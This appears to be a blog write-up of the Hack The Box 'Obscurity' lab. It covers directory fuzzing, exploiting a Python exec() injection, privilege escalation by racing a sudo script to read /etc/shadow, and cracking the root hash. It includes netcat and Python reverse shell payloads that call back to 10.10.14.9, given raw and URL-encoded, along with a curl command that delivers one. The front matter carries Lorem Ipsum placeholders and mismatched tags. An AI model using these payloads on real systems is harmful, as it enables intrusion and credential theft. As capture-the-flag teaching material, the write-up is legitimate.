---
layout: single
title: Obscurity - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2019-12-12
classes: wide
header:
  teaser: /assets/images/htb-writeup-obscurity/obscurity_logo.png
  teaser_home_page: true
  icon: /assets/images/htb.png
categories:
  - hackthebox
  - infosec
tags:  
  - osticket
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-obscurity/obscurity_logo.png)

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."

----------------


   ██╗   ██╗███████╗███████╗██████╗
   ██║   ██║██╔════╝██╔════╝██╔══██╗
   ██║   ██║███████╗█████╗  ██████╔╝
   ██║   ██║╚════██║██╔══╝  ██╔══██╗
   ╚██████╔╝███████║███████╗██║  ██║
    ╚═════╝ ╚══════╝╚══════╝╚═╝  ╚═╝

1. root@kali:/opt/htb/machines/bitlab# nmapAutomatorDirb.sh 10.10.10.168 All
    22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
    |   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
    |_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
    8080/tcp open  http-proxy BadHTTPServer
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    DIRB
    + http://10.10.10.168:8080/index.html (CODE:200|SIZE:4171)

    NIKTO
    + Server: BadHTTPServer


2. Looking on the website we find
    - 'security through obscurity'; we write all our own software from scratch
    - A custom written web server 70% (Currently resolving minor stability issues; server will restart if it hangs for 30 seconds)
    - An unbreakable encryption algorithm 85%
    - A more secure replacement to SSH 95%
    - to server devs: the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory

3. We use ffuf to find the path to the source code SuperSecureServer.py
    root@p3:/opt# ffuf -c -w /usr/share/dirb/wordlists/common.txt -u http://10.10.10.168:8080/FUZZ/SuperSecureServer.py

            /'___\  /'___\           /'___\
           /\ \__/ /\ \__/  __  __  /\ \__/
           \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
            \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
             \ \_\   \ \_\  \ \____/  \ \_\
              \/_/    \/_/   \/___/    \/_/

           v1.0-rc1
    ________________________________________________

     :: Method           : GET
     :: URL              : http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
     :: Follow redirects : false
     :: Calibration      : false
     :: Timeout          : 10
     :: Threads          : 40
     :: Matcher          : Response status: 200,204,301,302,307,401,403
    ________________________________________________

    develop                 [Status: 200, Size: 5892, Words: 1806, Lines: 171]
    :: Progress: [4614/4614] :: 461 req/sec :: Duration: [0:00:10] :: Errors: 0 ::

   URL to Source Code: http://obscurity.htb:8080/develop/SuperSecureServer.py

4. Reading the source code we find a voulnerable exec-function on line 139.
    exec(info.format(path)) # This is how you do string formatting, right?

   This can also be identified using bandit.
    root@p3:/opt/htb/machines/obscurity# bandit SuperSecureServer.py
      --------------------------------------------------
      >> Issue: [B102:exec_used] Use of exec detected.
         Severity: Medium   Confidence: High
         Location: SuperSecureServer.py:139
         More Info: https://bandit.readthedocs.io/en/latest/plugins/b102_exec_used.html
      138	            info = "output = 'Document: {}'" # Keep the output for later debug
      139	            exec(info.format(path)) # This is how you do string formatting, right?
      140	            cwd = os.path.dirname(os.path.realpath(__file__))

      --------------------------------------------------

   The code tells us that path = urllib.parse.unquote(path). Looking at urlparse we find that everything behind / will be path.
   This is where we should execute our code (http://obscurity.htb:8080/EXPLOIT-CODE-HERE)
    >>> o = urlparse('http://www.cwi.nl:80/%7Eguido/Python.html')
    >>> o
    ParseResult(scheme='http', netloc='www.cwi.nl:80', path='/%7Eguido/Python.html',
                params='', query='', fragment='')

5. Setup a local nc listener and execute a python reverse shell. Break the exec-funtion using '; at the beginning of line
   and end it with #. Below are two diffrenet types of shell approaches.

    Native:
    1. OS System, NC Reverse
      ';os.system("rm /tmp/f ; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1|nc 10.10.14.9 4488 > /tmp/f");#
    2. Python Reverse (Pentestmonkey)
      ';import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.9",4488));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);#

    URL-Encoded:
    1. OS System, NC Reverse
      %27%3Bos.system%28%22rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.9%204488%20%3E%20%2Ftmp%2Ff%22%29%3B%23
    2. Python Reverse (Pentestmonkey)
      %27%3Bimport%20socket%2Csubprocess%2Cos%3Bs%3Dsocket.socket%28socket.AF_INET%2Csocket.SOCK_STREAM%29%3Bs.connect%28%28%2210.10.14.9%22%2C4488%29%29%3Bos.dup2%28s.fileno%28%29%2C0%29%3B%20os.dup2%28s.fileno%28%29%2C1%29%3B%20os.dup2%28s.fileno%28%29%2C2%29%3Bp%3Dsubprocess.call%28%5B%22%2Fbin%2Fsh%22%2C%22-i%22%5D%29%3B%23


    root@p3:/opt/htb/machines/obscurity# curl -X POST http://obscurity.htb:8080/%27%3Bos.system%28%22rm%20%2Ftmp%2Ff%20%3B%20mkfifo%20%2Ftmp%2Ff%3B%20cat%20%2Ftmp%2Ff%20%7C%20%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%2010.10.14.9%204488%20%3E%20%2Ftmp%2Ff%22%29%3B%23
    root@p3:/opt/htb/machines/obscurity# nc -lvnp 4488
      listening on [any] 4488 ...
      connect to [10.10.14.9] from (UNKNOWN) [10.10.10.168] 60698
    $ id
      uid=33(www-data) gid=33(www-data) groups=33(www-data)

6. Upgrade the shell. In /home/robert we find a python encryption scrip, two test files (check.txt & out.txt), and pass-file.

   Test Files:
    www-data@obscure:/home/robert$ cat check.txt
      Encrypting this file with your key should result in out.txt, make sure your key is correct!
    www-data@obscure:/home/robert$ cat out.txt
      ¦ÚÈêÚÞØÛÝÝ	×ÐÊß
      ÞÊÚÉæßÝËÚÛÚêÙÉëéÑÒÝÍÐ
      êÆáÙÞãÒÑÐáÙ¦ÕæØãÊÎÍßÚêÆÝáäè	ÎÍÚÎëÑÓäáÛÌ×	v

   Encrypted password-file:
    www-data@obscure:/home/robert$ cat passwordreminder.txt
      ´ÑÈÌÉàÙÁÑé¯·¿

   And the actuall encryption/decryption scrip, SuperSecureCrypt.py.

7. Since we have both check.txt and out.txt we can reverse the script to get the key. Easiest way to do this would to write
   a script that loop through all letters to look for a match. This can also be done manually, which I did.

   Encrypt check.txt with key a, check if the first letter match out.txt (using vi), if it does move on to the next character.
   root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k a
   root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k al
   root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k ale
   ..
   root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -i check.txt -o test-out.txt -k alexandrovich

   The encrypted out.txt and test-out.txt matches, hence the key is alexandrovich

   NOTE: Writing a bruteforce script using rockyou.txt is also applicable, however 'alexandrovich' is on row 10 245 981.
   My bruteforce script had been running for about 3 hours and was on word 'tariq1' - line 128 767.
    root@p3:/opt/htb/machines/obscurity# cat /usr/share/wordlists/rockyou.txt | grep -n alexandrovich
      10245981:alexandrovich
    root@p3:/opt/htb/machines/obscurity# cat /usr/share/wordlists/rockyou.txt | grep -n tariq1
      128767:tariq1

8. Decrypt passwordreminder.txt using the found key. Grab user.txt
    root@p3:/opt/htb/machines/obscurity# python3 SuperSecureCrypt.py -d -i passwordreminder.txt -o pass-decrypt.txt -k alexandrovich
    Opening file passwordreminder.txt...
    Decrypting...
    Writing to pass-decrypt.txt...
    root@p3:/opt/htb/machines/obscurity# cat pass-decrypt.txt
    SecThruObsFTW

    SSH CREDENTIALS: robert:SecThruObsFTW

    root@p3:/opt/htb/machines/obscurity# ssh robert@obscurity.htb
    robert@obscurity.htb's password: (SecThruObsFTW)
      Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64)
      Last login: Thu Dec 12 13:04:18 2019 from 10.10.14.9
    robert@obscure:~$ cat user.txt
      e4493782066b55fe2755708736ada2d7


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██████╗  ██████╗  ██████╗ ████████╗
   ██╔══██╗██╔═══██╗██╔═══██╗╚══██╔══╝
   ██████╔╝██║   ██║██║   ██║   ██║
   ██╔══██╗██║   ██║██║   ██║   ██║
   ██║  ██║╚██████╔╝╚██████╔╝   ██║
   ╚═╝  ╚═╝ ╚═════╝  ╚═════╝    ╚═╝


1. Sudo -l shows that we can run the script BetterSSH.py as sudo.
    robert@obscure:/tmp/SSH$ sudo -l
      Matching Defaults entries for robert on obscure:
      env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

      User robert may run the following commands on obscure:
      (ALL) NOPASSWD: /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py

2. Running the script we can see that it tries to create a temporary file to /tmp/SSH/RANDOM-NAME and compare it to /etc/shadow

    Running without sudo shows we don't have permissions to /etc/shadow
      robert@obscure:/tmp$ /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
      Enter username: root
      Enter password: root
        Traceback (most recent call last):
          File "/home/robert/BetterSSH/BetterSSH.py", line 15, in <module>
            with open('/etc/shadow', 'r') as f:
        PermissionError: [Errno 13] Permission denied: '/etc/shadow'

    Running as sudo the file/dir doesn't exist
      robert@obscure:/tmp$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
      Enter username: root
      Enter password: root
        Traceback (most recent call last):
          File "/home/robert/BetterSSH/BetterSSH.py", line 24, in <module>
            with open('/tmp/SSH/'+path, 'w') as f:
        FileNotFoundError: [Errno 2] No such file or directory: '/tmp/SSH/NeXWO4w1'

    Create the dir /tmp/SSH and run the script again with sudo
      robert@obscure:/tmp$ mkdir /tmp/SSH
      robert@obscure:/tmp$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
      Enter username: root
      Enter password: root
        Incorrect pass

3. We need a way to grab the temporary created file from /tmp/SSH to get the hashes from /etc/shadow.
   Using the watch command with timer 0.1 seconds (-n 0) we can see that the file is created and removed.

   robert@obscure:/tmp/SSH$ watch -cd -n 0 cat /tmp/SSH/*

   In order to capture data we need to write the watch output to a file, we write a simple script for this.

   robert@obscure:/tmp$ cat watch-root.sh
    #!/bin/bash
    while true
    do
      cat /tmp/SSH/* >> /tmp/root-out.txt
      sleep 0.1
    done

   Run the watch-script, run BetterSSH.py and grab the hashes from /etc/shadow.

   robert@obscure:/tmp$ ./watch-root.sh
    cat: '/tmp/SSH/*': No such file or directory
    ..
    ..

   robert@obscure:~$ sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py
    Enter username: root
    Enter password: root
      Incorrect pass

   robert@obscure:/tmp$ cat root-out.txt
     root
     $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1

4. We now have the type 6 password hash (SHA-512) of root. We can crack this using hashcat -m1800
    root@p3:/opt/htb/machines/obscurity# echo "\$6\$riekpK4m\$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1" | tee root.hash
    root@p3:/opt/htb/machines/obscurity# hashcat -a0 -m1800 root.hash /usr/share/wordlists/rockyou.txt -o root.cracked --force
      Session..........: hashcat
      Status...........: Cracked
      Hash.Type........: sha512crypt $6$, SHA512 (Unix)
      Hash.Target......: $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbV...1h4dy1
      Time.Started.....: Thu Dec 12 15:26:11 2019 (2 secs)
      Time.Estimated...: Thu Dec 12 15:26:13 2019 (0 secs)
      Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
      Guess.Queue......: 1/1 (100.00%)
      Speed.#1.........:      491 H/s (6.72ms) @ Accel:64 Loops:32 Thr:1 Vec:4
      Recovered........: 1/1 (100.00%) Digests, 1/1 (100.00%) Salts
      Progress.........: 768/14344385 (0.01%)
      Rejected.........: 0/768 (0.00%)
      Restore.Point....: 0/14344385 (0.00%)
      Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:4992-5000
      Candidates.#1....: 123456 -> james1

      Started: Thu Dec 12 15:26:02 2019
      Stopped: Thu Dec 12 15:26:14 2019

    root@p3:/opt/htb/machines/obscurity# cat root.cracked
      $6$riekpK4m$uBdaAyK0j9WfMzvcSKYVfyEHGtBfnfpiVbYbzbVmfbneEbo0wSijW1GQussvJSk8X1M56kzgGj8f7DFN1h4dy1:mercedes

5. Escalate from robert to root, grab root.txt.
    robert@obscure:~$ su
    Password: (mercedes)
    root@obscure:/home/robert# id
      uid=0(root) gid=0(root) groups=0(root)
    root@obscure:/home/robert# cat /root/root.txt
      512fd4429f33a113a44d5acde23609e3


██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████

   ██╗███╗   ██╗███████╗ ██████╗ ██████╗ ███╗   ███╗ █████╗ ████████╗██╗ ██████╗ ███╗   ██╗
   ██║████╗  ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗  ██║
   ██║██╔██╗ ██║█████╗  ██║   ██║██████╔╝██╔████╔██║███████║   ██║   ██║██║   ██║██╔██╗ ██║
   ██║██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║╚██╔╝██║██╔══██║   ██║   ██║██║   ██║██║╚██╗██║
   ██║██║ ╚████║██║     ╚██████╔╝██║  ██║██║ ╚═╝ ██║██║  ██║   ██║   ██║╚██████╔╝██║ ╚████║
   ╚═╝╚═╝  ╚═══╝╚═╝      ╚═════╝ ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚═╝ ╚═════╝ ╚═╝  ╚═══╝


Watch
  https://ubuntuforums.org/showthread.php?t=2008978
  https://unix.stackexchange.com/questions/56093/output-of-watch-command-as-a-list

Hashcat
  https://samsclass.info/123/proj10/p12-hashcat.htm
```